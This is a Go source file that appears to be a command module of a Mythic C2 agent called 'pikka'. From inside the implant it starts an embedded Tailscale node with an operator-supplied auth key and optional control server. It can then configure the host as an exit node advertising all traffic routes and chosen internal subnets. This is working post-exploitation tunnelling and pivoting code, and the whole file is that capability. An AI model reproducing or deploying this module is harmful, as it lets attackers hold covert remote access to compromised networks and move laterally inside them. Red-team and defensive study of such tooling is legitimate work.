package tsconnect

import (
	"context"
	"encoding/json"
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils/structs"
	"tailscale.com/ipn"
	"tailscale.com/tsnet"
)

type Arguments struct {
	Action         string `json:"action"`
	AuthKey        string `json:"auth_key"`
	Hostname       string `json:"hostname"`
	StateDir       string `json:"state_dir"`
	Ephemeral      bool   `json:"ephemeral"`
	ControlURL     string `json:"control_url"`
	AdvertiseRoutes string `json:"advertise_routes"`
	AllowLANAccess bool   `json:"allow_lan_access"`
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["action"]; ok {
		e.Action = v.(string)
	}
	if v, ok := alias["auth_key"]; ok {
		e.AuthKey = v.(string)
	}
	if v, ok := alias["hostname"]; ok {
		e.Hostname = v.(string)
	}
	if v, ok := alias["state_dir"]; ok {
		e.StateDir = v.(string)
	}
	if v, ok := alias["ephemeral"]; ok {
		e.Ephemeral = v.(bool)
	}
	if v, ok := alias["control_url"]; ok {
		e.ControlURL = v.(string)
	}
	if v, ok := alias["advertise_routes"]; ok {
		e.AdvertiseRoutes = v.(string)
	}
	if v, ok := alias["allow_lan_access"]; ok {
		e.AllowLANAccess = v.(bool)
	}
	return nil
}

var (
	tsServer *tsnet.Server
	mu       sync.Mutex
)

func Run(task structs.Task) {
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		errResp := task.NewResponse()
		errResp.SetError(fmt.Sprintf("Failed to parse arguments: %s", err.Error()))
		task.Job.SendResponses <- errResp
		return
	}

	switch args.Action {
	case "start":
		startServer(task, args)
	case "stop":
		stopServer(task)
	case "status":
		getStatus(task)
	case "exit_node":
		configureExitNode(task, args)
	default:
		errResp := task.NewResponse()
		errResp.SetError(fmt.Sprintf("Unknown action: %s", args.Action))
		task.Job.SendResponses <- errResp
	}
}

func startServer(task structs.Task, args Arguments) {
	mu.Lock()
	defer mu.Unlock()

	if tsServer != nil {
		errResp := task.NewResponse()
		errResp.SetError("Tailscale node is already running. Stop it first.")
		task.Job.SendResponses <- errResp
		return
	}

	if args.AuthKey == "" {
		errResp := task.NewResponse()
		errResp.SetError("auth_key is required to start a tsnet connection")
		task.Job.SendResponses <- errResp
		return
	}

	stateDir := args.StateDir
	if stateDir == "" {
		stateDir = filepath.Join(os.TempDir(), fmt.Sprintf("tsnet-%d", os.Getpid()))
	}

	hostname := args.Hostname
	if hostname == "" {
		hostname = fmt.Sprintf("pikka-%d", os.Getpid())
	}

	srv := &tsnet.Server{
		Hostname:  hostname,
		AuthKey:   args.AuthKey,
		Dir:       stateDir,
		Ephemeral: args.Ephemeral,
	}

	if args.ControlURL != "" {
		srv.ControlURL = args.ControlURL
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	status, err := srv.Up(ctx)
	if err != nil {
		srv.Close()
		errResp := task.NewResponse()
		errResp.SetError(fmt.Sprintf("Failed to start Tailscale node: %s", err.Error()))
		task.Job.SendResponses <- errResp
		return
	}

	tsServer = srv

	output := "Tailscale node started successfully\n"
	output += fmt.Sprintf("Hostname: %s\n", hostname)
	output += fmt.Sprintf("Ephemeral: %v\n", args.Ephemeral)
	output += fmt.Sprintf("State dir: %s\n", stateDir)
	if status.Self != nil {
		for _, ip := range status.Self.TailscaleIPs {
			output += fmt.Sprintf("Tailscale IP: %s\n", ip.String())
		}
		if status.Self.DNSName != "" {
			output += fmt.Sprintf("DNS Name: %s\n", status.Self.DNSName)
		}
	}

	resp := task.NewResponse()
	resp.UserOutput = output
	resp.Completed = true
	task.Job.SendResponses <- resp
}

func stopServer(task structs.Task) {
	mu.Lock()
	defer mu.Unlock()

	if tsServer == nil {
		errResp := task.NewResponse()
		errResp.SetError("No Tailscale node is currently running")
		task.Job.SendResponses <- errResp
		return
	}

	err := tsServer.Close()
	tsServer = nil
	if err != nil {
		errResp := task.NewResponse()
		errResp.SetError(fmt.Sprintf("Error stopping Tailscale node: %s", err.Error()))
		task.Job.SendResponses <- errResp
		return
	}

	resp := task.NewResponse()
	resp.UserOutput = "Tailscale node stopped"
	resp.Completed = true
	task.Job.SendResponses <- resp
}

func getStatus(task structs.Task) {
	mu.Lock()
	defer mu.Unlock()

	if tsServer == nil {
		resp := task.NewResponse()
		resp.UserOutput = "No Tailscale node is currently running"
		resp.Completed = true
		task.Job.SendResponses <- resp
		return
	}

	lc, err := tsServer.LocalClient()
	if err != nil {
		errResp := task.NewResponse()
		errResp.SetError(fmt.Sprintf("Failed to get local client: %s", err.Error()))
		task.Job.SendResponses <- errResp
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	status, err := lc.Status(ctx)
	if err != nil {
		errResp := task.NewResponse()
		errResp.SetError(fmt.Sprintf("Failed to get status: %s", err.Error()))
		task.Job.SendResponses <- errResp
		return
	}

	output := fmt.Sprintf("Tailscale Status: %s\n", status.BackendState)
	if status.Self != nil {
		output += fmt.Sprintf("Hostname: %s\n", status.Self.HostName)
		output += fmt.Sprintf("DNS Name: %s\n", status.Self.DNSName)
		output += fmt.Sprintf("OS: %s\n", status.Self.OS)
		for _, ip := range status.Self.TailscaleIPs {
			output += fmt.Sprintf("Tailscale IP: %s\n", ip.String())
		}
		output += fmt.Sprintf("Online: %v\n", status.Self.Online)
		output += fmt.Sprintf("Exit Node: %v\n", status.Self.ExitNode)
		output += fmt.Sprintf("Exit Node Option: %v\n", status.Self.ExitNodeOption)
	}

	prefs, err := lc.GetPrefs(ctx)
	if err == nil && len(prefs.AdvertiseRoutes) > 0 {
		output += "Advertised Routes:\n"
		for _, r := range prefs.AdvertiseRoutes {
			output += fmt.Sprintf("  - %s\n", r.String())
		}
	}

	if len(status.Peer) > 0 {
		output += fmt.Sprintf("\nPeers (%d):\n", len(status.Peer))
		for _, peer := range status.Peer {
			peerOnline := ""
			if peer.Online {
				peerOnline = " [online]"
			}
			output += fmt.Sprintf("  - %s (%s)%s\n", peer.HostName, peer.DNSName, peerOnline)
			for _, ip := range peer.TailscaleIPs {
				output += fmt.Sprintf("      IP: %s\n", ip.String())
			}
		}
	}

	resp := task.NewResponse()
	resp.UserOutput = output
	resp.Completed = true
	task.Job.SendResponses <- resp
}

func configureExitNode(task structs.Task, args Arguments) {
	mu.Lock()
	defer mu.Unlock()

	if tsServer == nil {
		errResp := task.NewResponse()
		errResp.SetError("No Tailscale node is currently running. Start one first with action 'start'.")
		task.Job.SendResponses <- errResp
		return
	}

	lc, err := tsServer.LocalClient()
	if err != nil {
		errResp := task.NewResponse()
		errResp.SetError(fmt.Sprintf("Failed to get local client: %s", err.Error()))
		task.Job.SendResponses <- errResp
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	routes := []netip.Prefix{
		netip.MustParsePrefix("0.0.0.0/0"),
		netip.MustParsePrefix("::/0"),
	}

	if args.AdvertiseRoutes != "" {
		for _, cidr := range strings.Split(args.AdvertiseRoutes, ",") {
			cidr = strings.TrimSpace(cidr)
			if cidr == "" {
				continue
			}
			prefix, err := netip.ParsePrefix(cidr)
			if err != nil {
				errResp := task.NewResponse()
				errResp.SetError(fmt.Sprintf("Invalid CIDR %q: %s", cidr, err.Error()))
				task.Job.SendResponses <- errResp
				return
			}
			routes = append(routes, prefix)
		}
	}

	mp := &ipn.MaskedPrefs{
		AdvertiseRoutesSet:        true,
		ExitNodeAllowLANAccessSet: true,
	}
	mp.Prefs.AdvertiseRoutes = routes
	mp.Prefs.ExitNodeAllowLANAccess = args.AllowLANAccess

	updatedPrefs, err := lc.EditPrefs(ctx, mp)
	if err != nil {
		errResp := task.NewResponse()
		errResp.SetError(fmt.Sprintf("Failed to configure exit node: %s", err.Error()))
		task.Job.SendResponses <- errResp
		return
	}

	output := "Exit node configuration applied\n"
	output += "Advertised routes:\n"
	for _, r := range updatedPrefs.AdvertiseRoutes {
		output += fmt.Sprintf("  - %s\n", r.String())
	}
	output += fmt.Sprintf("Allow LAN access: %v\n", updatedPrefs.ExitNodeAllowLANAccess)
	output += "\nNOTE: The exit node must be approved in the Tailscale admin console\n"
	output += "(or via ACL autoApprovers) before peers can use it.\n"

	resp := task.NewResponse()
	resp.UserOutput = output
	resp.Completed = true
	task.Job.SendResponses <- resp
}
